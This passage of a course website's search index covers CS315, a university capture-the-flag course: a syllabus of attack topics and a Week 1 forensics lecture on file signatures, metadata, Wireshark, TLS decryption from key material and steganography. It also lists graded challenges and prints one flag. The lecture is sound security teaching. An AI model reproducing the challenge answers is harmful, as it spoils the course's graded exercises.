\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u7cfb\u7edf\u5730\u8bb2\u89e3\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u4e0e\u5229\u7528\u6240\u9700\u7684\u5404\u7c7b\u5de5\u5177\u3001\u7406\u8bba\u6280\u672f\u548c\u5b9e\u6218\u65b9\u6cd5\uff0c\u4e3b\u8981\u6d89\u53caWindows \u548cAndroid \u7cfb\u7edf\u5e73\u53f0\u3002\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u6839\u636e\u4e0d\u540c\u7684\u8f6f\u4ef6\u6f0f\u6d1e\u7c7b\u578b\u5212\u5206\uff0c\u6bd4\u5982\u5806\u6808\u6ea2\u51fa\u3001\u6c99\u76d2\u9003\u9038\u3001\u7c7b\u578b\u6df7\u6dc6\u3001UAF\u3001\u5185\u6838\u6f0f\u6d1e\u7b49\uff0c\u540c\u65f6\u53c8\u9488\u5bf9\u5f53\u524d\u6d41\u884c\u7684\u79fb\u52a8\u5b89\u5168\uff0c\u52a0\u5165Android \u5e73\u53f0\u4e0a\u7684\u6f0f\u6d1e\u5206\u6790\u4e0e\u5229\u7528\u3002\u4ee5\u7cbe\u5fc3\u6311\u9009\u7684\u7ecf\u5178\u6f0f\u6d1e\u4e3a\u4f8b\uff0c\u4ee5\u5206\u4eab\u6f0f\u6d1e\u7684\u5206\u6790\u6280\u5de7\u548c\u5de5\u5177\u4e3a\u4e3b\uff0c\u5bf9\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u6210\u56e0\u3001\u5229\u7528\u53ca\u4fee\u590d\u65b9\u6cd5\u8fdb\u884c\u8be6\u7ec6\u8bb2\u89e3\uff0c\u65e8\u5728\"\u6388\u4e4b\u4ee5\u6e14\"\u3002\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u6700\u5927\u7684\u7279\u70b9\u662f\u4ee5\u5404\u79cd\u7c7b\u578b\u7684\u7ecf\u5178\u6f0f\u6d1e\u4f5c\u4e3a\u5b9e\u6218\u8bb2\u89e3\uff0c\u6452\u5f03\u7a7a\u5934\u7406\u8bba\uff0c\u51e0\u4e4e\u662f\"\u4e00\u672c\u7528\u8c03\u8bd5\u5668\u5199\u51fa\u6765\u7684\u4e66\"\u3002 \u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u9002\u5408\u8ba1\u7b97\u673a\u76f8\u5173\u4e13\u4e1a\u7684\u672c\u79d1\u53ca\u7814\u7a76\u751f\uff0c\u4fe1\u606f\u5b89\u5168\u7231\u597d\u8005\uff0c\u8f6f\u4ef6\u5b89\u5168\u53ca\u79fb\u52a8\u5b89\u5168\u76f8\u5173\u7684\u5b89\u5168\u4ece\u4e1a\u4eba\u5458\uff0c\u8f6f\u4ef6\u5f00\u53d1\u4e0e\u6d4b\u8bd5\u4eba\u5458\u3001\u9ed1\u5ba2\u7b49\u9605\u8bfb\u3002 Cover","title":"\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981"},{"location":"Book/Security/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/#_1","text":"Author: \u6797\u6860\u6cc9","title":"\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981"},{"location":"Book/Security/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/#introduction","text":"\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u7cfb\u7edf\u5730\u8bb2\u89e3\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u4e0e\u5229\u7528\u6240\u9700\u7684\u5404\u7c7b\u5de5\u5177\u3001\u7406\u8bba\u6280\u672f\u548c\u5b9e\u6218\u65b9\u6cd5\uff0c\u4e3b\u8981\u6d89\u53caWindows \u548cAndroid \u7cfb\u7edf\u5e73\u53f0\u3002\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u6839\u636e\u4e0d\u540c\u7684\u8f6f\u4ef6\u6f0f\u6d1e\u7c7b\u578b\u5212\u5206\uff0c\u6bd4\u5982\u5806\u6808\u6ea2\u51fa\u3001\u6c99\u76d2\u9003\u9038\u3001\u7c7b\u578b\u6df7\u6dc6\u3001UAF\u3001\u5185\u6838\u6f0f\u6d1e\u7b49\uff0c\u540c\u65f6\u53c8\u9488\u5bf9\u5f53\u524d\u6d41\u884c\u7684\u79fb\u52a8\u5b89\u5168\uff0c\u52a0\u5165Android \u5e73\u53f0\u4e0a\u7684\u6f0f\u6d1e\u5206\u6790\u4e0e\u5229\u7528\u3002\u4ee5\u7cbe\u5fc3\u6311\u9009\u7684\u7ecf\u5178\u6f0f\u6d1e\u4e3a\u4f8b\uff0c\u4ee5\u5206\u4eab\u6f0f\u6d1e\u7684\u5206\u6790\u6280\u5de7\u548c\u5de5\u5177\u4e3a\u4e3b\uff0c\u5bf9\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u6210\u56e0\u3001\u5229\u7528\u53ca\u4fee\u590d\u65b9\u6cd5\u8fdb\u884c\u8be6\u7ec6\u8bb2\u89e3\uff0c\u65e8\u5728\"\u6388\u4e4b\u4ee5\u6e14\"\u3002\u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u6700\u5927\u7684\u7279\u70b9\u662f\u4ee5\u5404\u79cd\u7c7b\u578b\u7684\u7ecf\u5178\u6f0f\u6d1e\u4f5c\u4e3a\u5b9e\u6218\u8bb2\u89e3\uff0c\u6452\u5f03\u7a7a\u5934\u7406\u8bba\uff0c\u51e0\u4e4e\u662f\"\u4e00\u672c\u7528\u8c03\u8bd5\u5668\u5199\u51fa\u6765\u7684\u4e66\"\u3002 \u300a\u6f0f\u6d1e\u6218\u4e89\uff1a\u8f6f\u4ef6\u6f0f\u6d1e\u5206\u6790\u7cbe\u8981\u300b\u9002\u5408\u8ba1\u7b97\u673a\u76f8\u5173\u4e13\u4e1a\u7684\u672c\u79d1\u53ca\u7814\u7a76\u751f\uff0c\u4fe1\u606f\u5b89\u5168\u7231\u597d\u8005\uff0c\u8f6f\u4ef6\u5b89\u5168\u53ca\u79fb\u52a8\u5b89\u5168\u76f8\u5173\u7684\u5b89\u5168\u4ece\u4e1a\u4eba\u5458\uff0c\u8f6f\u4ef6\u5f00\u53d1\u4e0e\u6d4b\u8bd5\u4eba\u5458\u3001\u9ed1\u5ba2\u7b49\u9605\u8bfb\u3002","title":"Introduction"},{"location":"Book/Security/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/#cover","text":"","title":"Cover"},{"location":"CS315/Exercise%20Solutions/","text":"Exercise Solutions Week 1 solution: PDF Week 2 solution: PDF Week 3 solution: PDF Week 4 solution: PDF Week 5 solution: PDF Week 6 solution: PDF Week 7 solution: PDF","title":"Exercise Solutions"},{"location":"CS315/Exercise%20Solutions/#exercise-solutions","text":"Week 1 solution: PDF Week 2 solution: PDF Week 3 solution: PDF Week 4 solution: PDF Week 5 solution: PDF Week 6 solution: PDF Week 7 solution: PDF","title":"Exercise Solutions"},{"location":"CS315/Overview/","text":"Overview Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions. Grading Policy Topics Grade Lab1: Forensics 10 Lab2: Buffer Overflow 10 Lab3: Web Information Discovery 10 Lab4: Web Vulnerability Exploit 10 Lab5: De-compiling Program 10 Lab6: Attacking WiFi 10 Lab7: Physical Attacks 10 Lab8: Social Engineering 10 Lab9: Privilege Escalation 10 Lab10: Public Key Crypto Attacking 10 Lab11: Attacking Websites 10 Lab12: ROL and ROP 10 Attack and Defense CTF (bonus) 100 Class Schedule CTFs in CS315 Course aims to provide an experimental environment. Instructions of CTF components in CS315 are as follow: Date Topic Content File Week 1 CTF Introduction and Forensics 1. Introduce CTF 2. Basic Forensics 3. Network traffic analysis Week 1.md Week 2 PWN: Basic Buffer Overflow 1. Introduce PWN 2. Stack and buffer overflow 3. Return to shellcode Week 2.md Week 2.pdf Week 3 PWN: Advanced Buffer Overflow 1. Calling conversion 2. Binary security 3. Bypass canary & PIE Week 3.md Week 4 WEB: Information Discovery 1. Passive information gathering 2. Active information gathering Week 4.md Week 5 WEB: Vulnerability Exploit 1. Injection 2. Traversal 3. CSRF & XSS 4. SSRF Week 5.md Week 6 RE: De-compiling Program 1. Assembly 2. From C to assembly 3. Disassemblers and Decompiles 4. Debugging with GDB Week 6.md Week 7 WLAN: Attacking WiFi 1. WiFi attacking tools 2. Resume attack 3. WiFi crypto attack 4. Evil Twin Week 7.md Week 8 MISC: Physical Attacks 1. BIOS 2. Bad USB 3. Attack printers Week 8.md Week 9 MISC: Social Engineering 1. Cloning a website 2. Phishing Week 9.md Week 10 PWN: Privilege Escalation 1. Gather vulnerabilities 2. Privilege escalation Week 10.md Week 11 CRYPTO: Public Key Crypto Attacking 1. Traditional crypto 2. Hash functions 3. RSA Week 11.md Week 12 WEB: Attacking Websites 1. OWASP top 10 2. Proxies vulnerabilities 3. User input vulnerabilities Week 12.md Week 13 PWN: ROL and ROP 1. ROP 2. Dynamic ROP chain 3. ROL Week 13.md Week 14 CTF: Attack-Defense CTF 1. Introduction 2. Environment set 3. Grading Week 14.md Contact me If you have any questions about the CTF part, feel free to contact me : liz33[at]mail.sustech.edu.cn","title":"Overview"},{"location":"CS315/Overview/#overview","text":"Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. In this guide/wiki/handbook you'll learn the techniques, thought processes, and methodologies you need to succeed in Capture the Flag competitions.","title":"Overview"},{"location":"CS315/Overview/#grading-policy","text":"Topics Grade Lab1: Forensics 10 Lab2: Buffer Overflow 10 Lab3: Web Information Discovery 10 Lab4: Web Vulnerability Exploit 10 Lab5: De-compiling Program 10 Lab6: Attacking WiFi 10 Lab7: Physical Attacks 10 Lab8: Social Engineering 10 Lab9: Privilege Escalation 10 Lab10: Public Key Crypto Attacking 10 Lab11: Attacking Websites 10 Lab12: ROL and ROP 10 Attack and Defense CTF (bonus) 100","title":"Grading Policy"},{"location":"CS315/Overview/#class-schedule","text":"CTFs in CS315 Course aims to provide an experimental environment. Instructions of CTF components in CS315 are as follow: Date Topic Content File Week 1 CTF Introduction and Forensics 1. Introduce CTF 2. Basic Forensics 3. Network traffic analysis Week 1.md Week 2 PWN: Basic Buffer Overflow 1. Introduce PWN 2. Stack and buffer overflow 3. Return to shellcode Week 2.md Week 2.pdf Week 3 PWN: Advanced Buffer Overflow 1. Calling conversion 2. Binary security 3. Bypass canary & PIE Week 3.md Week 4 WEB: Information Discovery 1. Passive information gathering 2. Active information gathering Week 4.md Week 5 WEB: Vulnerability Exploit 1. Injection 2. Traversal 3. CSRF & XSS 4. SSRF Week 5.md Week 6 RE: De-compiling Program 1. Assembly 2. From C to assembly 3. Disassemblers and Decompiles 4. Debugging with GDB Week 6.md Week 7 WLAN: Attacking WiFi 1. WiFi attacking tools 2. Resume attack 3. WiFi crypto attack 4. Evil Twin Week 7.md Week 8 MISC: Physical Attacks 1. BIOS 2. Bad USB 3. Attack printers Week 8.md Week 9 MISC: Social Engineering 1. Cloning a website 2. Phishing Week 9.md Week 10 PWN: Privilege Escalation 1. Gather vulnerabilities 2. Privilege escalation Week 10.md Week 11 CRYPTO: Public Key Crypto Attacking 1. Traditional crypto 2. Hash functions 3. RSA Week 11.md Week 12 WEB: Attacking Websites 1. OWASP top 10 2. Proxies vulnerabilities 3. User input vulnerabilities Week 12.md Week 13 PWN: ROL and ROP 1. ROP 2. Dynamic ROP chain 3. ROL Week 13.md Week 14 CTF: Attack-Defense CTF 1. Introduction 2. Environment set 3. Grading Week 14.md","title":"Class Schedule"},{"location":"CS315/Overview/#contact-me","text":"If you have any questions about the CTF part, feel free to contact me : liz33[at]mail.sustech.edu.cn","title":"Contact me"},{"location":"CS315/Week%201/","text":"Week 1 CTF Introduction and Forensics Introduction to CTF Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. Figure: CTFs on the CTFtime website. These contests run every month by various organizations and universities across the globe. These contests can be arranged in the 3 styles: Jeopardy Attack & Defense Mixed Style Most of the CTFs are online, while some of them (usually finals) are offline. The most famous CTF is the DEF CON CTF , which is held every August annually. In our semester, every lab would have several CTF challenges in Jeopardy format. By the end of this semester, yet another AWD (Attack & Defense) CTF would be hold. Categories In Jeopardy format CTFs, there are usually 5 categories: Forensics Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded. Cryptography Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. Web Exploitation Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privileges. Reverse Engineering Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Some other categories growing up in recent years, like IoT (Internet of Thing) and AI. Forensics An important part of Forensics is having the right tools, as well as being familiar with the following topics: File Formats EXIF data Wireshark & PCAPs Wireshark traffic analysis Steganography (Optional) Disk Imaging File Formats File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called file signatures which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called metadata which can be useful in finding out information about the context of a file's data. File Signatures File signatures (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file. What is it used for? Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly. How do you find the file signature? You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories such as Gary Kessler\u2019s . Example The file above, when opened in a Hex Editor, begins with the bytes FFD8FFE0 00104A46 494600 or in ASCII \u02c7\u00ff\u02c7\u2021 JFIF where \\x00 and \\x10 lack symbols. Searching in Gary Kessler\u2019s database shows that this file signature belongs to a JPEG/JFIF graphics file , exactly what we suspect. Extensions vs Signature File extension is used to uniquely describe a format of a particular file whereas file signature is the header information that is present in each file . Some operating systems (Windows like) use file extension to bind with applications to open the file, while some other operating systems check file signature in the header to guess the file format (file command in Unix). What about MIME? A media type (also known as a Multipurpose Internet Mail Extensions or MIME type) is a standard that indicates the nature and format of a document, file, or assortment of bytes . It is defined and standardized in IETF's RFC 6838. This type is identified in HTTP packets and DO NOT stipulate the real file format. For example, a MIME type image/jpg means the transferred data LIKELY to be a JPEG image, but user can post a plain text or anything in real body. Example \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502 \u2502 \u2502 HTTP packe \u2502 \u2502 \u2502 \u2502 MIME:image/jpg \u2502 \u2502 \u2502 A \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 \u250c\u2500\u2500\u2510 \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba B \u2502 \u2502 \u2502 \u2502 \u2502 \u2502 \u2502flag.jpg \u2502 \u2502 \u2514\u2500\u252c\u2518 \u2502 \u2502 \u2502 \u2502 \u2514\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2502 \u2502 \u25bc \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502GIF89a\\xc8\\x00 \u2502 \u2502\\x96\\x00\\xf7\\x00\u2502 \u2502... \u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 The file signature is GIF8 while the file extension is .jpg , with the MIME type image/jpg during HTTP transmission. The given file is a GIF image instead of JPEG file. Metadata Metadata is data about data. Different types of files have different metadata. The metadata on a photo could include dates, camera information, GPS location, comments, etc. For music, it could include the title, author, track number and album. What kind of file metadata is useful? Potentially, any file metadata you can find could be useful. How do I find it? One of our favorite tools is exiftool, which displays metadata for an input file, including: - File size - Dimensions (width and height) - File type - Programs used to create (e.g. Photoshop) - OS used to create (e.g. Apple) Run command line: exiftool(-k).exe [filename] and you should see something like this: Example Let's take a look at File A's metadata with exiftool: File type Image description Make and camera info GPS Latitude/Longitude Timestamps Timestamps are data that indicate the time of certain events (MAC): - Modification \u2013 when a file was modified - Access \u2013 when a file or entries were read or accessed - Creation \u2013 when files or entries were created Types of timestamps Modified Accessed Created Date Changed (MFT) Filename Date Created (MFT) Filename Date Modified (MFT) Filename Date Accessed (MFT) INDX Entry Date Created INDX Entry Date Modified INDX Entry Date Accessed INDX Entry Date Changed Why do we care? Certain events such as creating, moving, copying, opening, editing, etc. might affect the MAC times. If the MAC timestamps can be attained, a timeline of events could be created. Timeline Patterns There are plenty more patterns than the ones introduced below, but these are the basics you should start with to get a good understanding of how it works, and to complete this challenge. Examples We know that the BMP files fileA and fileD are the same, but that the JPEG files fileB and fileC are different somehow. So how can we find out what went on with these files? By using time stamp information from the file system, we can learn that the BMP fileD was the original file, with fileA being a copy of the original. Afterward, fileB was created by modifying fileB, and fileC was created by modifying fileA in a different way. Follow along as we demonstrate. We\u2019ll start by analyzing images in AccessData FTK Imager, where there\u2019s a Properties window that shows you some information about the file or folder you\u2019ve selected. Here are the extracted MAC times for fileA, fileB, fileC and fileD: Note, AccessData FTK Imager assumes that the file times on the drive are in UTC (Universal Coordinated Time). I subtracted four hours, since the USB was set up in Eastern Standard Time. This isn\u2019t necessary, but it helps me understand the times a bit better. Highlight timestamps that are the same, if timestamps are off by a few seconds, they should be counted as the same. This lets you see a clear difference between different timestamps. Then, highlight oldest to newest to help put them in order. Identify timestamp patterns. Wireshark Wireshark is a network protocol analyzer which is often used in CTF challenges to look at recorded network traffic. Wireshark uses a filetype called PCAP to record traffic. PCAPs are often distributed in CTF challenges to provide recorded traffic history. Interface Upon opening Wireshark, you are greeted with the option to open a PCAP or begin capturing network traffic on your device. The network traffic displayed initially shows the packets in order of which they were captured. You can filter packets by protocol, source IP address, destination IP address, length, etc. In order to apply filters, simply enter the constraining factor, for example 'http', in the display filter bar. Filters can be chained together using '&&' notation. In order to filter by IP, ensure a double equals '==' is used. The most pertinent part of a packet is its data payload and protocol information. Decrypting SSL Traffic By default, Wireshark cannot decrypt SSL traffic on your device unless you grant it specific certificates. High Level SSL Handshake Overview In order for a network session to be encrypted properly, the client and server must share a common secret for which they can use to encrypt and decrypt data without someone in the middle being able to guess. The SSL Handshake loosely follows this format: The client sends a list of availble cipher suites it can use along with a random set of bytes referred to as client_random The server sends back the cipher suite that will be used, such as TLS_DHE_RSA_WITH_AES_128_CBC_SHA, along with a random set of bytes referred to as server_random The client generates a pre-master secret, encrypts it, then sends it to the server. The server and client then generate a common master secret using the selected cipher suite The client and server begin communicating using this common secret Decryption Requirements There are several ways to be able to decrypt traffic. If you have the client and server random values and the pre-master secret, the master secret can be generated and used to decrypt the traffic If you have the master secret, traffic can be decrypted easily If the cipher-suite uses RSA, you can factor n in the key in order to break the encryption on the encrypted pre-master secret and generate the master secret with the client and server randoms Steganography Steganography is the practice of hiding data in plain sight. Steganography is often embedded in images or audio. You could send a picture of a cat to a friend and hide text inside. Looking at the image, there\u2019s nothing to make anyone think there\u2019s a message hidden inside it. You could also hide a second image inside the first. Steganography Detection So we can hide text and an image, how do we find out if there is hidden data? FileA and FileD appear the same, but they\u2019re different. Also, FileD was modified after it was copied, so it\u2019s possible there might be steganography in it. FileB and FileC don\u2019t appear to have been modified after being created. That doesn\u2019t rule out the possibility that there\u2019s steganography in them, but you\u2019re more likely to find it in fileD. This brings up two questions: Can we determine that there is steganography in fileD? If there is, what was hidden in it? LSB Steganography File are made of bytes. Each byte is composed of eight bits. Changing the least-significant bit (LSB) doesn\u2019t change the value very much. So we can modify the LSB without changing the file noticeably. By doing so, we can hide a message inside. LSB Steganography in Images LSB Steganography or Least Significant Bit Steganography is a method of Steganography where data is recorded in the lowest bit of a byte. Say an image has a pixel with an RGB value of (255, 255, 255), the bits of those RGB values will look like 1 1 1 1 1 1 1 1 By modifying the lowest, or least significant, bit, we can use the 1 bit space across every RGB value for every pixel to construct a message. 1 1 1 1 1 1 1 0 The reason Steganography is hard to detect by sight is because a 1 bit difference in color is insignificant as seen below. Example Let\u2019s say we have an image, and part of it contains the following binary: And let\u2019s say we want to hide the character y inside. First, we need to convert the hidden message to binary. Now we take each bit from the hidden message and replace the LSB of the corresponding byte with it. And again: And again: And again: And again: And again: And again: And once more: Decoding LSB steganography is exactly the same as encoding, but in reverse. For each byte, grab the LSB and add it to your decoded message. Once you\u2019ve gone through each byte, convert all the LSBs you grabbed into text or a file. (You can use your file signature knowledge here!) What other types of steganography are there? Steganography is hard for the defense side, because there\u2019s practically an infinite number of ways it could be carried out. Here are a few examples: - LSB steganography: different bits, different bit combinations - Encode in every certain number of bytes - Use a password - Hide in different places - Use encryption on top of steganography Blind Watermark Blind watermark is a kind of technique to embed one picture or string to another image. Just like the regular watermark, but the blind watermark cannot be detected by using human eyes. The transformed image is indistinguishable from the origin one. Furthermore, blind watermark should be able to bypass different types of processing of image. For example, rotating the picture should not broke the blind watermark. Some modern researches are focusing on the strong transform of the image, such like film the image from another screen. Example encode: original image watermark python encode.py --image ori.png --watermark watermark.png --result res.png result decode: python decode.py --original ori.png --image res.png --result extract.png watermark Hex Editor A hexadecimal (hex) editor (also called a binary file editor or byte editor) is a computer program you can use to manipulate the fundamental binary data that constitutes a computer file. The name \u201chex\u201d comes from \u201chexadecimal,\u201d a standard numerical format for representing binary data. A typical computer file occupies multiple areas on the platter(s) of a disk drive, whose contents are combined to form the file. Hex editors that are designed to parse and edit sector data from the physical segments of floppy or hard disks are sometimes called sector editors or disk editors. A hex editor is used to see or edit the raw, exact contents of a file. Hex editors may used to correct data corrupted by a system or application. A list of editors can be found on the forensics Wiki. You can download one and install it on your system. Example Open fileA.jpg in a hex editor. (Most Hex editors have either a \u201cFile > Open\u201d option or a simple drag and drop.) When you open fileA.jpg in your hex editor, you should see something similar to this: Your hex editor should also have a \u201cgo to\u201d or \u201cfind\u201d feature so you can jump to a specific byte. Exercise Every lab we will have 2 or 3 challenges about the topics this week. But in case the difficulty of the challenge, only the first 2 challenges are required. But if you want to fight CTF so hard, you can try the third one. Solving the third one would give you extra points for this lab and some prizes as well. For finishing the challenges, you may click this site: COMPASS CTF Platform and find the category CS315 . Other challenges are for CTF team members, but you also can finish them freely. After uploading the flag on the platform, you also need to upload a writeup to blackboard system to grade. The writeup is a file to describe how you solve the challenges and you need also post flag in it. The writeup would use to grade and in case you forget to submit the writeup, during the argue procedure, we would check the submission in platform. Example writeup (5 pt) Congratulations! Now in order to check whether you are a robot, you need to submit this flag to show that you are a real human! flag{w31com3_t0_CS315_c0Urs3!!!} The flag you submit should be flag{w31com3_t0_CS315_c0Urs3!!!} , and the example writeup probably be: Writeup.md I am a human so I copied the flag and submit it. Here is the flag: flag{w31com3_t0_CS315_c0Urs3!!!} (5 pt) What is so called stream? The network is so bad that I can't even send TCP stream through Internet. Wondering if I can use \"UDP streams\"... capture.pcap Try to find flag in this file, the flag format is: picoCTF{***} Hint1: Wireshark may be useful. (5 pt) HTTPS with secret sauce Solved the network problem yesterday, but I found some guy was sniffing my network traffic. I need to be careful to protect my flag. Decide to use HTTPS to submit my flag to web01.fruitinc.xyz . By the way, upload my super\u2606secret\u2606file to network disk. capture.pcapng pre-master secret.txt Try to find flag in this file, the flag format is: flag{y2***} (BONUS 5 pt) Bytes through network That hacker still got my flag! Fine, I'm going to send my file byte by byte. Besides, combined with my knowledge of programming, encryption, and stenography I'm going to fight the final round. WE ARE IN THE ENDGAME NOW. capture.pcapng Try to find flag in this file, the flag format is: flag{***} This challenge is extremely hard. The winner will get a badge for solving this.","title":"Week 1 CTF Introduction and Forensics"},{"location":"CS315/Week%201/#week-1-ctf-introduction-and-forensics","text":"","title":"Week 1 CTF Introduction and Forensics"},{"location":"CS315/Week%201/#introduction-to-ctf","text":"Capture The Flags, or CTFs, are a kind of computer security competition. Teams of competitors (or just individuals) are pitted against each other in a test of computer security skill. Very often CTFs are the beginning of one's cyber security career due to their team building nature and competitive aspect. In addition, there isn't a lot of commitment required beyond a weekend. Figure: CTFs on the CTFtime website. These contests run every month by various organizations and universities across the globe. These contests can be arranged in the 3 styles: Jeopardy Attack & Defense Mixed Style Most of the CTFs are online, while some of them (usually finals) are offline. The most famous CTF is the DEF CON CTF , which is held every August annually. In our semester, every lab would have several CTF challenges in Jeopardy format. By the end of this semester, yet another AWD (Attack & Defense) CTF would be hold.","title":"Introduction to CTF"},{"location":"CS315/Week%201/#categories","text":"In Jeopardy format CTFs, there are usually 5 categories: Forensics Forensics is the art of recovering the digital trail left on a computer. There are plenty of methods to find data which is seemingly deleted, not stored, or worse, covertly recorded. Cryptography Cryptography is the reason we can use banking apps, transmit sensitive information over the web, and in general protect our privacy. However, a large part of CTFs is breaking widely used encryption schemes which are improperly implemented. The math may seem daunting, but more often than not, a simple understanding of the underlying principles will allow you to find flaws and crack the code. The word \u201ccryptography\u201d technically means the art of writing codes. When it comes to digital forensics, it\u2019s a method you can use to understand how data is constructed for your analysis. Web Exploitation Websites all around the world are programmed using various programming languages. While there are specific vulnerabilities in each programming langage that the developer should be aware of, there are issues fundamental to the internet that can show up regardless of the chosen language or framework. These vulnerabilities often show up in CTFs as web security challenges where the user needs to exploit a bug to gain some kind of higher level privileges. Reverse Engineering Reverse Engineering in a CTF is typically the process of taking a compiled (machine code, bytecode) program and converting it back into a more human readable format. Very often the goal of a reverse engineering challenge is to understand the functionality of a given program such that you can identify deeper issues. Binary Exploitation Binaries, or executables, are machine code for a computer to execute. For the most part, the binaries that you will face in CTFs are Linux ELF files or the occasional windows executable. Binary Exploitation is a broad topic within Cyber Security which really comes down to finding a vulnerability in the program and exploiting it to gain control of a shell or modifying the program's functions. Some other categories growing up in recent years, like IoT (Internet of Thing) and AI.","title":"Categories"},{"location":"CS315/Week%201/#forensics","text":"An important part of Forensics is having the right tools, as well as being familiar with the following topics: File Formats EXIF data Wireshark & PCAPs Wireshark traffic analysis Steganography (Optional) Disk Imaging","title":"Forensics"},{"location":"CS315/Week%201/#file-formats","text":"File Extensions are not the sole way to identify the type of a file, files have certain leading bytes called file signatures which allow programs to parse the data in a consistent manner. Files can also contain additional \"hidden\" data called metadata which can be useful in finding out information about the context of a file's data.","title":"File Formats"},{"location":"CS315/Week%201/#file-signatures","text":"File signatures (also known as File Magic Numbers) are bytes within a file used to identify the format of the file. Generally they\u2019re 2-4 bytes long, found at the beginning of a file.","title":"File Signatures"},{"location":"CS315/Week%201/#what-is-it-used-for","text":"Files can sometimes come without an extension, or with incorrect ones. We use file signature analysis to identify the format (file type) of the file. Programs need to know the file type in order to open it properly.","title":"What is it used for?"},{"location":"CS315/Week%201/#how-do-you-find-the-file-signature","text":"You need to be able to look at the binary data that constitutes the file you\u2019re examining. To do this, you\u2019ll use a hexadecimal editor. Once you find the file signature, you can check it against file signature repositories such as Gary Kessler\u2019s .","title":"How do you find the file signature?"},{"location":"CS315/Week%201/#example","text":"The file above, when opened in a Hex Editor, begins with the bytes FFD8FFE0 00104A46 494600 or in ASCII \u02c7\u00ff\u02c7\u2021 JFIF where \\x00 and \\x10 lack symbols. Searching in Gary Kessler\u2019s database shows that this file signature belongs to a JPEG/JFIF graphics file , exactly what we suspect.","title":"Example"},{"location":"CS315/Week%201/#extensions-vs-signature","text":"File extension is used to uniquely describe a format of a particular file whereas file signature is the header information that is present in each file . Some operating systems (Windows like) use file extension to bind with applications to open the file, while some other operating systems check file signature in the header to guess the file format (file command in Unix).","title":"Extensions vs Signature"},{"location":"CS315/Week%201/#what-about-mime","text":"A media type (also known as a Multipurpose Internet 